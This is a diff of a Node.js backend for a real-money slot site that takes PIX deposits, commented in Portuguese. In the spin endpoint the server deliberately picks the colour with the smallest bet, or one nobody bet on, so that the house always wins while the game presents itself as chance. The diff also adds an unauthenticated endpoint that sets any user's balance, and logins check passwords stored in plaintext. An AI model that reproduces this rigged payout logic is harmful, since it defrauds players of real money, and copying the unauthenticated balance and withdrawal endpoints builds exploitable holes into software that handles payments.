@@ -15,15 +15,17 @@ const User = mongoose.model('User', new mongoose.Schema({
     user: { type: String, unique: true },
     pass: String,
     fone: String,
-    saldo: { type: Number, default: 0.00 }
+    saldo: { type: Number, default: 0.00 } // SALDO INICIAL ZERADO
 }));
 
-// LÓGICA DE DECISÃO DO VENCEDOR (CASA GANHA)
+// LÓGICA DE GIRO (QUEM GANHA PERDE, QUEM PERDE PERDEU)
 app.post('/api/spin', async (req, res) => {
     try {
         const { user, bets } = req.body;
         const userDb = await User.findOne({ user });
-        
+        if (!userDb) return res.status(404).json({ success: false });
+
+        // ACHA A COR QUE DÁ MENOS PREJUÍZO (CASA SEMPRE GANHA NO VOLUME)
         let corAlvo = 0;
         let menorValor = Infinity;
         let coresVazias = [];
@@ -33,26 +35,29 @@ app.post('/api/spin', async (req, res) => {
             if (valor < menorValor) { menorValor = valor; corAlvo = i; }
         });
 
+        // Se houver cores sem aposta, cai nelas para a casa não pagar nada
         if (coresVazias.length > 0) {
             corAlvo = coresVazias[Math.floor(Math.random() * coresVazias.length)];
         }
 
-        const premio = bets[corAlvo] * 5.0;
-        const novoSaldo = Number((userDb.saldo + premio).toFixed(2));
-        await User.findOneAndUpdate({ user }, { saldo: novoSaldo });
+        // O prêmio é calculado apenas se o servidor escolheu a cor que ele apostou
+        const premio = bets[corAlvo] * 5.0; 
+        
+        // NOVO SALDO: O saldo já foi descontado no HTML ao apostar, 
+        // aqui o servidor apenas SOMA o prêmio se ele ganhou.
+        const novoSaldoOficial = Number((userDb.saldo + premio).toFixed(2));
+        await User.findOneAndUpdate({ user }, { saldo: novoSaldoOficial });
 
-        res.json({ success: true, corAlvo, novoSaldo, ganhou: premio > 0 });
+        res.json({ 
+            success: true, 
+            corAlvo, 
+            novoSaldo: novoSaldoOficial, 
+            ganhou: premio > 0 
+        });
     } catch (e) { res.status(500).json({ success: false }); }
 });
 
-// LOGIN E CADASTRO
-app.post('/auth/login', async (req, res) => {
-    const { user, pass } = req.body;
-    const conta = await User.findOne({ user, pass });
-    if (conta) res.json({ success: true, saldo: conta.saldo });
-    else res.json({ success: false, message: "Dados incorretos" });
-});
-
+// CADASTRO COM SALDO ZERO
 app.post('/auth/cadastro', async (req, res) => {
     try {
         const novo = new User({ ...req.body, saldo: 0.00 });
@@ -61,15 +66,27 @@ app.post('/auth/cadastro', async (req, res) => {
     } catch (e) { res.json({ success: false, message: "Usuário já existe" }); }
 });
 
+app.post('/auth/login', async (req, res) => {
+    const { user, pass } = req.body;
+    const conta = await User.findOne({ user, pass });
+    if (conta) res.json({ success: true, saldo: conta.saldo });
+    else res.json({ success: false, message: "Dados incorretos" });
+});
+
+app.post('/api/save-saldo', async (req, res) => {
+    await User.findOneAndUpdate({ user: req.body.user }, { saldo: req.body.saldo });
+    res.json({ success: true });
+});
+
 // SAQUE
 app.post('/api/saque', async (req, res) => {
     const { user, valor, chave } = req.body;
     const u = await User.findOne({ user });
-    if (u.saldo >= valor && valor >= 10) {
+    if (u && u.saldo >= valor && valor >= 10) {
         await User.findOneAndUpdate({ user }, { $inc: { saldo: -valor } });
-        console.log(`SOLICITAÇÃO DE SAQUE: ${user} - R$${valor} - PIX: ${chave}`);
+        console.log(`--- SOLICITAÇÃO DE SAQUE --- \nUser: ${user} \nValor: R$${valor} \nPIX: ${chave}`);
         res.json({ success: true });
-    } else res.json({ success: false, message: "Saldo insuficiente ou valor baixo" });
+    } else res.json({ success: false, message: "Saldo insuficiente (Mínimo R$10)" });
 });
 
 // MERCADO PAGO
@@ -83,10 +100,10 @@ app.post('/gerar-pix', async (req, res) => {
             description: 'Deposito SlotReal',
             payment_method_id: 'pix',
             external_reference: req.body.userLogado,
-            payer: { email: 'contato@slot.com' }
+            payer: { email: 'pix@slot.com' }
         }});
         res.json({ copia_e_cola: result.point_of_interaction.transaction_data.qr_code, imagem_qr: result.point_of_interaction.transaction_data.qr_code_base64 });
     } catch (e) { res.status(500).json(e); }
 });
 
-app.listen(10000, () => console.log("Servidor ON"));
+app.listen(10000, () => console.log("🔥 MOTOR LIGADO NA 10000"));
